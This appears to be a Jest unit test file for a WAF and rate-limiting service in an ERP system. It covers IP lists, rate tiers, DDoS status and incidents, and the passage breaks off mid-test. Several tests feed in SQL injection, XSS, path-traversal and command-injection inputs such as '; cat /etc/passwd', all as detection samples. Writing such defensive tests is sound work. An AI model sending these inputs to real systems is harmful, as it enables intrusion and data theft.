/**
 * AL-AWAEL ERP — RateLimitWafService — Unit Tests
 * Complete coverage for rate-limit-waf.service.js
 */

jest.mock('crypto', () => ({
  randomBytes: jest.fn(() => ({ toString: jest.fn(() => 'abcdef123456') })),
  randomUUID: jest.fn(() => 'uuid-test-0001'),
}));

const EventEmitter = require('events');
const RateLimitWafService = require('../../services/rate-limit-waf.service');

let service;

beforeEach(() => {
  jest.clearAllMocks();
  service = new RateLimitWafService();
});

/* ═══════════════════════════════════════════════════════════════
   1. MODULE EXPORTS
   ═══════════════════════════════════════════════════════════════ */
describe('Module exports', () => {
  it('exports the RateLimitWafService class', () => {
    expect(RateLimitWafService).toBeDefined();
    expect(typeof RateLimitWafService).toBe('function');
  });

  it('extends EventEmitter', () => {
    expect(service).toBeInstanceOf(EventEmitter);
  });

  it('can be instantiated with new', () => {
    const s = new RateLimitWafService();
    expect(s).toBeInstanceOf(RateLimitWafService);
  });
});

/* ═══════════════════════════════════════════════════════════════
   2. CONSTRUCTOR — DEFAULT CONFIG
   ═══════════════════════════════════════════════════════════════ */
describe('Constructor defaults', () => {
  it('sets default rate-limit config values', () => {
    expect(service.config.globalRateLimit).toBe(1000);
    expect(service.config.ipRateLimit).toBe(100);
    expect(service.config.userRateLimit).toBe(200);
    expect(service.config.endpointRateLimit).toBe(60);
    expect(service.config.burstLimit).toBe(50);
    expect(service.config.windowMs).toBe(60000);
  });

  it('sets default DDoS thresholds', () => {
    expect(service.config.ddosConnectionFlood).toBe(500);
    expect(service.config.ddosRequestFlood).toBe(2000);
    expect(service.config.ddosSlowlorisTimeout).toBe(5000);
  });

  it('sets default WAF config', () => {
    expect(service.config.wafEnabled).toBe(true);
    expect(service.config.wafMode).toBe('block');
    expect(service.config.challengeMode).toBe('captcha');
  });

  it('sets default geo-blocking config', () => {
    expect(service.config.geoBlockEnabled).toBe(false);
    expect(service.config.blockedCountries).toEqual([]);
    expect(service.config.allowedCountries).toEqual([]);
  });

  it('sets default alert config', () => {
    expect(service.config.alertOnBlock).toBe(true);
    expect(service.config.alertThreshold).toBe(10);
  });

  it('initializes all in-memory stores', () => {
    expect(service.ipBlacklist).toBeInstanceOf(Map);
    expect(service.ipWhitelist).toBeInstanceOf(Map);
    expect(service.ipGreylist).toBeInstanceOf(Map);
    expect(service.rateLimitCounters).toBeInstanceOf(Map);
    expect(service.blockedRequests).toEqual([]);
    expect(service.incidents).toEqual([]);
    expect(service.threatIntel).toEqual([]);
    expect(service.geoBlockLog).toEqual([]);
  });

  it('initializes 12 default WAF rules', () => {
    expect(service.wafRules).toHaveLength(12);
  });

  it('initializes 6 default rate-limit tiers', () => {
    expect(service.rateLimitTiers).toHaveLength(6);
  });

  it('initializes 3 default whitelisted IPs', () => {
    expect(service.ipWhitelist.size).toBe(3);
    expect(service.ipWhitelist.has('127.0.0.1')).toBe(true);
    expect(service.ipWhitelist.has('::1')).toBe(true);
    expect(service.ipWhitelist.has('72.60.84.56')).toBe(true);
  });

  it('initializes analytics to zero', () => {
    expect(service.analytics).toEqual({
      totalRequests: 0,
      blockedRequests: 0,
      challengedRequests: 0,
      passedRequests: 0,
    });
  });
});

/* ═══════════════════════════════════════════════════════════════
   3. CONSTRUCTOR — CUSTOM CONFIG
   ═══════════════════════════════════════════════════════════════ */
describe('Constructor custom config', () => {
  it('overrides rate-limit values', () => {
    const s = new RateLimitWafService({ ipRateLimit: 50, burstLimit: 20 });
    expect(s.config.ipRateLimit).toBe(50);
    expect(s.config.burstLimit).toBe(20);
    expect(s.config.globalRateLimit).toBe(1000); // unchanged default
  });

  it('overrides WAF mode', () => {
    const s = new RateLimitWafService({ wafMode: 'detect' });
    expect(s.config.wafMode).toBe('detect');
  });

  it('overrides geo-blocking settings', () => {
    const s = new RateLimitWafService({
      geoBlockEnabled: true,
      blockedCountries: ['CN', 'RU'],
    });
    expect(s.config.geoBlockEnabled).toBe(true);
    expect(s.config.blockedCountries).toEqual(['CN', 'RU']);
  });
});

/* ═══════════════════════════════════════════════════════════════
   4. analyzeRequest
   ═══════════════════════════════════════════════════════════════ */
describe('analyzeRequest', () => {
  it('allows clean request', () => {
    const result = service.analyzeRequest({
      ip: '10.0.0.1',
      path: '/api/test',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(true);
    expect(result.action).toBe('allow');
  });

  it('allows empty requestInfo (defaults)', () => {
    const result = service.analyzeRequest({});
    expect(result.allowed).toBe(true);
  });

  it('allows whitelisted IP immediately', () => {
    const result = service.analyzeRequest({
      ip: '127.0.0.1',
      path: '/anything',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(true);
    expect(result.reason).toBe('IP whitelisted');
  });

  it('blocks blacklisted IP', () => {
    service.addToBlacklist('10.0.0.99', 'bad actor', 'admin');
    const result = service.analyzeRequest({
      ip: '10.0.0.99',
      path: '/api/test',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('block');
    expect(result.reason).toContain('blacklisted');
  });

  it('removes expired blacklist entry and allows', () => {
    service.ipBlacklist.set('10.0.0.50', {
      reason: 'expired',
      addedAt: new Date(),
      expiresAt: new Date(Date.now() - 1000), // already expired
      addedBy: 'test',
    });
    const result = service.analyzeRequest({
      ip: '10.0.0.50',
      path: '/api/test',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(true);
    expect(service.ipBlacklist.has('10.0.0.50')).toBe(false);
  });

  it('blocks SQL injection in path', () => {
    const result = service.analyzeRequest({
      ip: '10.0.0.2',
      path: '/api?q=UNION SELECT * FROM users',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('block');
    expect(result.reason).toContain('WAF rule triggered');
  });

  it('blocks XSS script tag in path', () => {
    const result = service.analyzeRequest({
      ip: '10.0.0.3',
      path: '/api?q=<script>alert(1)</script>',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('block');
    expect(result.ruleId).toBe('xss-01');
  });

  it('blocks path traversal', () => {
    const result = service.analyzeRequest({
      ip: '10.0.0.4',
      path: '/api/../../../etc/passwd',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('WAF rule triggered');
  });

  it('detects bot user-agent', () => {
    const result = service.analyzeRequest({
      ip: '10.0.0.5',
      path: '/api/test',
      method: 'GET',
      headers: { 'user-agent': 'sqlmap/1.5' },
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('bot-01');
  });

  it('blocks when rate limit exceeded', () => {
    // Auth tier has limit 5 (endpoint scope) — triggers first at request 6
    for (let i = 0; i < 5; i++) {
      service.analyzeRequest({ ip: '10.0.0.10', path: '/api/test', method: 'GET', headers: {} });
    }
    const result = service.analyzeRequest({
      ip: '10.0.0.10',
      path: '/api/test',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('rate-limit');
  });

  it('blocks geo-blocked country', () => {
    service.updateConfig({ geoBlockEnabled: true, blockedCountries: ['CN'] });
    const result = service.analyzeRequest({
      ip: '10.0.0.20',
      path: '/api/test',
      method: 'GET',
      headers: {},
      country: 'CN',
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('geo-block');
  });

  it('increments totalRequests on each call', () => {
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    expect(service.analytics.totalRequests).toBe(2);
  });

  it('increments blockedRequests counter on block', () => {
    service.addToBlacklist('10.0.0.88', 'test');
    service.analyzeRequest({ ip: '10.0.0.88', path: '/', method: 'GET', headers: {} });
    expect(service.analytics.blockedRequests).toBe(1);
  });

  it('increments passedRequests for clean traffic', () => {
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    expect(service.analytics.passedRequests).toBe(1);
  });

  it('increments passedRequests for whitelisted IP', () => {
    service.analyzeRequest({ ip: '127.0.0.1', path: '/', method: 'GET', headers: {} });
    expect(service.analytics.passedRequests).toBe(1);
  });

  it('challenges greylist IP with high score', () => {
    service.ipGreylist.set('10.0.0.77', {
      score: 75,
      lastSeen: new Date(),
      challengeRequired: true,
    });
    const result = service.analyzeRequest({
      ip: '10.0.0.77',
      path: '/api/test',
      method: 'GET',
      headers: {},
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('challenge');
  });
});

/* ═══════════════════════════════════════════════════════════════
   5. BLACKLIST MANAGEMENT
   ═══════════════════════════════════════════════════════════════ */
describe('Blacklist management', () => {
  it('adds IP to blacklist', () => {
    const result = service.addToBlacklist('192.168.0.1', 'test reason', 'admin');
    expect(result.success).toBe(true);
    expect(result.ip).toBe('192.168.0.1');
    expect(result.action).toBe('blacklisted');
    expect(service.ipBlacklist.has('192.168.0.1')).toBe(true);
  });

  it('throws if IP is empty', () => {
    expect(() => service.addToBlacklist('', 'reason')).toThrow('IP is required');
    expect(() => service.addToBlacklist(null, 'reason')).toThrow('IP is required');
    expect(() => service.addToBlacklist(undefined, 'reason')).toThrow('IP is required');
  });

  it('adds with TTL (expiresAt set)', () => {
    service.addToBlacklist('10.10.10.1', 'temp ban', 'admin', 60000);
    const entry = service.ipBlacklist.get('10.10.10.1');
    expect(entry.expiresAt).toBeTruthy();
    expect(entry.expiresAt.getTime()).toBeGreaterThan(Date.now());
  });

  it('adds without TTL (expiresAt null)', () => {
    service.addToBlacklist('10.10.10.2', 'perm ban', 'admin');
    const entry = service.ipBlacklist.get('10.10.10.2');
    expect(entry.expiresAt).toBeNull();
  });

  it('removes IP from whitelist when blacklisted', () => {
    service.addToWhitelist('10.10.10.3', 'trusted');
    service.addToBlacklist('10.10.10.3', 'now bad');
    expect(service.ipWhitelist.has('10.10.10.3')).toBe(false);
  });

  it('removes IP from blacklist', () => {
    service.addToBlacklist('10.10.10.4', 'temp');
    const result = service.removeFromBlacklist('10.10.10.4');
    expect(result.success).toBe(true);
    expect(result.action).toBe('removed-from-blacklist');
    expect(service.ipBlacklist.has('10.10.10.4')).toBe(false);
  });

  it('throws when removing IP not in blacklist', () => {
    expect(() => service.removeFromBlacklist('1.2.3.4')).toThrow('IP not found in blacklist');
  });

  it('getBlacklist returns entries', () => {
    service.addToBlacklist('10.0.0.1', 'a');
    service.addToBlacklist('10.0.0.2', 'b');
    const bl = service.getBlacklist();
    expect(bl.total).toBe(2);
    expect(bl.entries).toHaveLength(2);
  });
});

/* ═══════════════════════════════════════════════════════════════
   6. WHITELIST MANAGEMENT
   ═══════════════════════════════════════════════════════════════ */
describe('Whitelist management', () => {
  it('includes 3 default entries', () => {
    const wl = service.getWhitelist();
    expect(wl.total).toBe(3);
  });

  it('adds IP to whitelist', () => {
    const result = service.addToWhitelist('10.20.30.1', 'trusted', 'admin');
    expect(result.success).toBe(true);
    expect(result.action).toBe('whitelisted');
    expect(service.ipWhitelist.has('10.20.30.1')).toBe(true);
  });

  it('throws if IP is empty', () => {
    expect(() => service.addToWhitelist('', 'reason')).toThrow('IP is required');
    expect(() => service.addToWhitelist(null)).toThrow('IP is required');
  });

  it('removes from blacklist and greylist on whitelist add', () => {
    service.addToBlacklist('10.20.30.2', 'bad');
    service.ipGreylist.set('10.20.30.2', { score: 50, lastSeen: new Date() });
    service.addToWhitelist('10.20.30.2', 'now good');
    expect(service.ipBlacklist.has('10.20.30.2')).toBe(false);
    expect(service.ipGreylist.has('10.20.30.2')).toBe(false);
  });

  it('removes IP from whitelist', () => {
    const result = service.removeFromWhitelist('127.0.0.1');
    expect(result.success).toBe(true);
    expect(result.action).toBe('removed-from-whitelist');
    expect(service.ipWhitelist.has('127.0.0.1')).toBe(false);
  });

  it('throws when removing IP not in whitelist', () => {
    expect(() => service.removeFromWhitelist('99.99.99.99')).toThrow('IP not found in whitelist');
  });
});

/* ═══════════════════════════════════════════════════════════════
   7. GREYLIST
   ═══════════════════════════════════════════════════════════════ */
describe('Greylist', () => {
  it('is initially empty', () => {
    const gl = service.getGreylist();
    expect(gl.total).toBe(0);
    expect(gl.entries).toEqual([]);
  });

  it('_incrementGreyScore adds IP to greylist', () => {
    service._incrementGreyScore('10.0.0.50', 20);
    expect(service.ipGreylist.has('10.0.0.50')).toBe(true);
    expect(service.ipGreylist.get('10.0.0.50').score).toBe(20);
  });

  it('_incrementGreyScore auto-blacklists at score >= 90', () => {
    service._incrementGreyScore('10.0.0.51', 95);
    expect(service.ipBlacklist.has('10.0.0.51')).toBe(true);
  });

  it('_incrementGreyScore caps score at 100', () => {
    service._incrementGreyScore('10.0.0.52', 60);
    service._incrementGreyScore('10.0.0.52', 60);
    expect(service.ipGreylist.get('10.0.0.52').score).toBe(100);
  });

  it('_incrementGreyScore sets challengeRequired when score > 70', () => {
    service._incrementGreyScore('10.0.0.53', 75);
    expect(service.ipGreylist.get('10.0.0.53').challengeRequired).toBe(true);
  });

  it('getGreylist returns entries with IP', () => {
    service._incrementGreyScore('10.0.0.60', 30);
    const gl = service.getGreylist();
    expect(gl.total).toBeGreaterThanOrEqual(1);
    const entry = gl.entries.find(e => e.ip === '10.0.0.60');
    expect(entry).toBeDefined();
    expect(entry.score).toBe(30);
  });
});

/* ═══════════════════════════════════════════════════════════════
   8. WAF RULES
   ═══════════════════════════════════════════════════════════════ */
describe('WAF rules', () => {
  it('lists all 12 default rules', () => {
    const result = service.listWafRules();
    expect(result.total).toBe(12);
    expect(result.rules).toHaveLength(12);
  });

  it('filters by category (sqli)', () => {
    const result = service.listWafRules({ category: 'sqli' });
    expect(result.total).toBe(3);
    result.rules.forEach(r => expect(r.category).toBe('sqli'));
  });

  it('filters by category (xss)', () => {
    const result = service.listWafRules({ category: 'xss' });
    expect(result.total).toBe(3);
  });

  it('filters by severity (critical)', () => {
    const result = service.listWafRules({ severity: 'critical' });
    expect(result.total).toBeGreaterThanOrEqual(4);
    result.rules.forEach(r => expect(r.severity).toBe('critical'));
  });

  it('filters by severity (medium)', () => {
    const result = service.listWafRules({ severity: 'medium' });
    expect(result.total).toBeGreaterThanOrEqual(2);
  });

  it('filters by enabled status', () => {
    service.toggleWafRule('sqli-01', false);
    const enabled = service.listWafRules({ enabled: true });
    const disabled = service.listWafRules({ enabled: false });
    expect(enabled.total).toBe(11);
    expect(disabled.total).toBe(1);
    expect(disabled.rules[0].id).toBe('sqli-01');
  });

  it('combines multiple filters', () => {
    const result = service.listWafRules({ category: 'sqli', severity: 'critical' });
    expect(result.total).toBe(2); // sqli-01, sqli-02
  });

  it('toggles WAF rule on/off', () => {
    const rule = service.toggleWafRule('xss-01', false);
    expect(rule.enabled).toBe(false);
    const rule2 = service.toggleWafRule('xss-01', true);
    expect(rule2.enabled).toBe(true);
  });

  it('throws when toggling non-existent rule', () => {
    expect(() => service.toggleWafRule('nonexistent', true)).toThrow('WAF rule not found');
  });

  it('adds custom WAF rule', () => {
    const rule = service.addWafRule({
      name: 'Custom Rule',
      category: 'custom',
      severity: 'high',
      pattern: 'evil-pattern',
      description: 'test',
    });
    expect(rule.id).toBe('custom-abcdef123456');
    expect(rule.name).toBe('Custom Rule');
    expect(rule.custom).toBe(true);
    expect(rule.enabled).toBe(true);
    expect(service.wafRules).toHaveLength(13);
  });

  it('throws when adding rule without name', () => {
    expect(() => service.addWafRule({ category: 'x' })).toThrow(
      'Rule name and category are required'
    );
  });

  it('throws when adding rule without category', () => {
    expect(() => service.addWafRule({ name: 'X' })).toThrow('Rule name and category are required');
  });

  it('deletes a WAF rule', () => {
    const result = service.deleteWafRule('sqli-01');
    expect(result.deleted).toBe(true);
    expect(result.ruleId).toBe('sqli-01');
    expect(service.wafRules).toHaveLength(11);
  });

  it('throws when deleting non-existent rule', () => {
    expect(() => service.deleteWafRule('does-not-exist')).toThrow('WAF rule not found');
  });
});

/* ═══════════════════════════════════════════════════════════════
   9. WAF SCANNING (_scanWafRules)
   ═══════════════════════════════════════════════════════════════ */
describe('WAF scanning', () => {
  it('detects SQL injection — UNION SELECT in path', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.2',
      method: 'GET',
      path: '/api?q=UNION SELECT * FROM users',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('sqli-02');
  });

  it('detects SQL injection — OR 1=1 in body', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.2',
      method: 'POST',
      path: '/api/login',
      headers: {},
      body: "admin' OR 1=1 --",
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('block');
  });

  it('detects SQL injection — comment (--)', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.2',
      method: 'GET',
      path: '/api?user=admin--',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('sqli-03');
  });

  it('detects XSS — script tag', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.3',
      method: 'GET',
      path: '/api?q=<script>alert(1)</script>',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('xss-01');
  });

  it('detects XSS — event handler (onerror=)', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.3',
      method: 'POST',
      path: '/api/comment',
      headers: {},
      body: '<img onerror=alert(1)>',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('xss-02');
  });

  it('detects XSS — javascript: URI', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.3',
      method: 'GET',
      path: '/redirect?url=javascript:alert(1)',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('xss-03');
  });

  it('detects path traversal (../)', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.4',
      method: 'GET',
      path: '/api/../../../etc/passwd',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('path-01');
  });

  it('detects command injection', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.5',
      method: 'POST',
      path: '/api/exec',
      headers: {},
      body: '; cat /etc/passwd',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('cmd-01');
  });

  it('detects bad bot user-agent', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.6',
      method: 'GET',
      path: '/api/test',
      headers: { 'user-agent': 'sqlmap/1.5.2' },
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('bot-01');
  });

  it('allows clean request', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.7',
      method: 'GET',
      path: '/api/users',
      headers: { 'user-agent': 'Mozilla/5.0' },
      body: '',
    });
    expect(result.allowed).toBe(true);
  });

  it('skips disabled rules', () => {
    service.toggleWafRule('sqli-02', false);
    const result = service._scanWafRules({
      ip: '10.0.0.2',
      method: 'GET',
      path: '/api?q=UNION SELECT * FROM users',
      headers: {},
      body: '',
    });
    // sqli-02 disabled, but sqli-03 may still catch the comment or sqli-01 the pattern
    // UNION SELECT with sqli-02 disabled — let's check if any other rule catches it
    // Actually, only sqli-02 matches UNION SELECT, so it should pass sqli checks
    // However other rules might not match, so allowed should be true
    // Unless sqli-01 pattern matches. sqli-01 pattern: (?:'|")?\\s*(?:OR|AND)\\s+.*=
    // "UNION SELECT * FROM users" doesn't match sqli-01
    // It should be allowed since sqli-02 is disabled
    expect(result.ruleId).not.toBe('sqli-02');
  });

  it('in detect mode, returns allowed:true with action log', () => {
    const s = new RateLimitWafService({ wafMode: 'detect' });
    const result = s._scanWafRules({
      ip: '10.0.0.2',
      method: 'GET',
      path: '/api?q=<script>alert(1)</script>',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(true);
    expect(result.action).toBe('log');
  });

  it('in challenge mode, returns action challenge', () => {
    const s = new RateLimitWafService({ wafMode: 'challenge' });
    const result = s._scanWafRules({
      ip: '10.0.0.2',
      method: 'GET',
      path: '/api?q=<script>alert(1)</script>',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('challenge');
  });
});

/* ═══════════════════════════════════════════════════════════════
   10. RATE LIMITING (_checkRateLimit)
   ═══════════════════════════════════════════════════════════════ */
describe('Rate limiting', () => {
  it('allows request under limit', () => {
    const result = service._checkRateLimit('10.0.0.1', '/api/test', null);
    expect(result.allowed).toBe(true);
  });

  it('blocks when burst tier exceeded (50 req/1s)', () => {
    // Burst tier: limit 50, windowMs 1000
    for (let i = 0; i < 50; i++) {
      service._checkRateLimit('10.0.0.1', '/api/test', null);
    }
    const result = service._checkRateLimit('10.0.0.1', '/api/test', null);
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('rate-limit');
  });

  it('tracks per-IP separately', () => {
    for (let i = 0; i < 50; i++) {
      service._checkRateLimit('10.0.0.1', '/api/test', null);
    }
    // Different IP should still be allowed
    const result = service._checkRateLimit('10.0.0.2', '/api/test', null);
    expect(result.allowed).toBe(true);
  });

  it('checks global tier', () => {
    // Global tier has limit 1000 — hard to exhaust but counter should exist
    service._checkRateLimit('10.0.0.1', '/api/test', null);
    expect(service.rateLimitCounters.has('global')).toBe(true);
  });

  it('checks user tier when userId provided', () => {
    service._checkRateLimit('10.0.0.1', '/api/test', 'user-123');
    const hasUserKey = [...service.rateLimitCounters.keys()].some(k => k.startsWith('user:'));
    expect(hasUserKey).toBe(true);
  });

  it('checks endpoint tier', () => {
    service._checkRateLimit('10.0.0.1', '/api/test', null);
    const hasEpKey = [...service.rateLimitCounters.keys()].some(k => k.startsWith('ep:'));
    expect(hasEpKey).toBe(true);
  });

  it('resets counter after window expires', () => {
    // Manually set an old counter
    service.rateLimitCounters.set('ip:10.0.0.1:burst', {
      count: 49,
      windowStart: Date.now() - 2000, // 2 seconds ago, burst window is 1s
    });
    const result = service._checkRateLimit('10.0.0.1', '/api/test', null);
    expect(result.allowed).toBe(true);
  });

  it('rate-limit result includes tier details', () => {
    for (let i = 0; i < 51; i++) {
      service._checkRateLimit('10.0.0.1', '/api/test', null);
    }
    const result = service._checkRateLimit('10.0.0.1', '/api/test', null);
    expect(result.details).toBeDefined();
    expect(result.details.tier).toBeDefined();
    expect(result.details.limit).toBeDefined();
  });

  it('skips disabled tiers', () => {
    // Disable both burst and auth tiers (auth has limit 5 for endpoints)
    service.toggleRateLimitTier('burst', false);
    service.toggleRateLimitTier('auth', false);
    // Now remaining IP-scoped tier is per-ip (limit 100)
    // 55 requests should be under that limit
    for (let i = 0; i < 55; i++) {
      service._checkRateLimit('10.0.0.1', '/api/test', null);
    }
    const result = service._checkRateLimit('10.0.0.1', '/api/test', null);
    expect(result.allowed).toBe(true);
  });

  it('auto-greylists offender on rate limit hit', () => {
    for (let i = 0; i < 51; i++) {
      service._checkRateLimit('10.0.0.1', '/api/test', null);
    }
    service._checkRateLimit('10.0.0.1', '/api/test', null);
    expect(service.ipGreylist.has('10.0.0.1')).toBe(true);
  });
});

/* ═══════════════════════════════════════════════════════════════
   11. RATE LIMIT TIERS
   ═══════════════════════════════════════════════════════════════ */
describe('Rate limit tiers', () => {
  it('lists 6 default tiers', () => {
    const result = service.listRateLimitTiers();
    expect(result.total).toBe(6);
    expect(result.tiers).toHaveLength(6);
  });

  it('default tiers include expected IDs', () => {
    const ids = service.rateLimitTiers.map(t => t.id);
    expect(ids).toContain('global');
    expect(ids).toContain('per-ip');
    expect(ids).toContain('per-user');
    expect(ids).toContain('per-endpoint');
    expect(ids).toContain('auth');
    expect(ids).toContain('burst');
  });

  it('upserts new tier', () => {
    const tier = service.upsertRateLimitTier({
      id: 'custom-tier',
      name: 'Custom',
      scope: 'ip',
      limit: 30,
      windowMs: 5000,
    });
    expect(tier.id).toBe('custom-tier');
    expect(tier.name).toBe('Custom');
    expect(service.rateLimitTiers).toHaveLength(7);
  });

  it('upserts existing tier (updates)', () => {
    service.upsertRateLimitTier({
      id: 'global',
      name: 'Updated Global',
      scope: 'global',
      limit: 2000,
    });
    const tier = service.rateLimitTiers.find(t => t.id === 'global');
    expect(tier.name).toBe('Updated Global');
    expect(tier.limit).toBe(2000);
    expect(service.rateLimitTiers).toHaveLength(6); // no new tier added
  });

  it('throws on upsert with missing fields', () => {
    expect(() => service.upsertRateLimitTier({ name: 'X' })).toThrow(
      'Name, scope, and limit are required'
    );
    expect(() => service.upsertRateLimitTier({ scope: 'ip', limit: 10 })).toThrow(
      'Name, scope, and limit are required'
    );
    expect(() => service.upsertRateLimitTier({ name: 'X', scope: 'ip' })).toThrow(
      'Name, scope, and limit are required'
    );
  });

  it('toggles tier enabled/disabled', () => {
    const tier = service.toggleRateLimitTier('burst', false);
    expect(tier.enabled).toBe(false);
    const tier2 = service.toggleRateLimitTier('burst', true);
    expect(tier2.enabled).toBe(true);
  });

  it('throws when toggling non-existent tier', () => {
    expect(() => service.toggleRateLimitTier('nope', true)).toThrow('Tier not found');
  });
});

/* ═══════════════════════════════════════════════════════════════
   12. DDOS STATUS
   ═══════════════════════════════════════════════════════════════ */
describe('DDoS status', () => {
  it('returns initial low threat level', () => {
    const status = service.getDDoSStatus();
    expect(status.threatLevel).toBe('low');
    expect(status.totalRequests).toBe(0);
    expect(status.blockedRequests).toBe(0);
    expect(status.blockRate).toBe(0);
    expect(status.activeBlacklisted).toBe(0);
    expect(status.greylistedIPs).toBe(0);
    expect(status.thresholds).toBeDefined();
    expect(status.timestamp).toBeDefined();
  });

  it('returns correct stats after some blocks', () => {
    service.addToBlacklist('10.0.0.1', 'bad');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    const status = service.getDDoSStatus();
    expect(status.totalRequests).toBe(1);
    expect(status.blockedRequests).toBe(1);
    expect(status.activeBlacklisted).toBe(1);
    expect(status.blockRate).toBe(100);
  });

  it('threat level increases with high block rate', () => {
    // block rate > 50% → critical
    service.addToBlacklist('10.0.0.1', 'bad');
    for (let i = 0; i < 3; i++) {
      service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    }
    const status = service.getDDoSStatus();
    expect(status.threatLevel).toBe('critical');
  });
});

/* ═══════════════════════════════════════════════════════════════
   13. INCIDENTS
   ═══════════════════════════════════════════════════════════════ */
describe('Incidents', () => {
  it('reports an incident with defaults', () => {
    const inc = service.reportIncident({});
    expect(inc.id).toBe('uuid-test-0001');
    expect(inc.type).toBe('ddos');
    expect(inc.severity).toBe('high');
    expect(inc.status).toBe('active');
    expect(inc.createdAt).toBeDefined();
    expect(inc.resolvedAt).toBeNull();
  });

  it('reports an incident with custom data', () => {
    const inc = service.reportIncident({
      type: 'brute-force',
      severity: 'critical',
      description: 'login attacks',
      sourceIPs: ['10.0.0.1'],
    });
    expect(inc.type).toBe('brute-force');
    expect(inc.severity).toBe('critical');
    expect(inc.description).toBe('login attacks');
    expect(inc.sourceIPs).toEqual(['10.0.0.1']);
  });

  it('emits incident:created event', () => {
    const handler = jest.fn();
    service.on('incident:created', handler);
    service.reportIncident({ type: 'test' });
    expect(handler).toHaveBeenCalledTimes(1);
    expect(handler).toHaveBeenCalledWith(expect.objectContaining({ type: 'test' }));
  });

  it('stores incident in list', () => {
    service.reportIncident({});
    expect(service.incidents).toHaveLength(1);
  });

  it('resolves incident', () => {
    const inc = service.reportIncident({});
    const resolved = service.resolveIncident(inc.id, 'mitigated');
    expect(resolved.status).toBe('resolved');
    expect(resolved.resolvedAt).toBeDefined();
    expect(resolved.resolution).toBe('mitigated');
  });

  it('throws when resolving non-existent incident', () => {
    expect(() => service.resolveIncident('no-such-id', 'x')).toThrow('Incident not found');
  });

  it('lists all incidents', () => {
    service.reportIncident({ type: 'ddos' });
    service.reportIncident({ type: 'brute-force' });
    const list = service.listIncidents();
    expect(list.total).toBe(2);
    expect(list.incidents).toHaveLength(2);
  });

  it('lists incidents filtered by status', () => {
    const inc = service.reportIncident({});
    service.reportIncident({});
    service.resolveIncident(inc.id, 'done');
    const active = service.listIncidents({ status: 'active' });
    const resolved = service.listIncidents({ status: 'resolved' });
    expect(active.total).toBe(1);
    expect(resolved.total).toBe(1);
  });

  it('lists incidents filtered by type', () => {
    service.reportIncident({ type: 'ddos' });
    service.reportIncident({ type: 'brute-force' });
    const list = service.listIncidents({ type: 'ddos' });
    expect(list.total).toBe(1);
    expect(list.incidents[0].type).toBe('ddos');
  });

  it('lists incidents with limit', () => {
    service.reportIncident({});
    service.reportIncident({});
    service.reportIncident({});
    const list = service.listIncidents({ limit: 2 });
    expect(list.incidents).toHaveLength(2);
  });
});

/* ═══════════════════════════════════════════════════════════════
   14. BLOCKED REQUESTS
   ═══════════════════════════════════════════════════════════════ */
describe('Blocked requests', () => {
  it('is initially empty', () => {
    const br = service.getBlockedRequests();
    expect(br.total).toBe(0);
    expect(br.requests).toEqual([]);
  });

  it('populates after blocks', () => {
    service.addToBlacklist('10.0.0.1', 'bad');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/x', method: 'GET', headers: {} });
    const br = service.getBlockedRequests();
    expect(br.total).toBe(1);
    expect(br.requests[0].ip).toBe('10.0.0.1');
  });

  it('filters by IP', () => {
    service.addToBlacklist('10.0.0.1', 'a');
    service.addToBlacklist('10.0.0.2', 'b');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/x', method: 'GET', headers: {} });
    service.analyzeRequest({ ip: '10.0.0.2', path: '/x', method: 'GET', headers: {} });
    const br = service.getBlockedRequests({ ip: '10.0.0.1' });
    expect(br.total).toBe(1);
  });

  it('filters by limit', () => {
    service.addToBlacklist('10.0.0.1', 'bad');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/a', method: 'GET', headers: {} });
    service.analyzeRequest({ ip: '10.0.0.1', path: '/b', method: 'GET', headers: {} });
    service.analyzeRequest({ ip: '10.0.0.1', path: '/c', method: 'GET', headers: {} });
    const br = service.getBlockedRequests({ limit: 2 });
    expect(br.requests).toHaveLength(2);
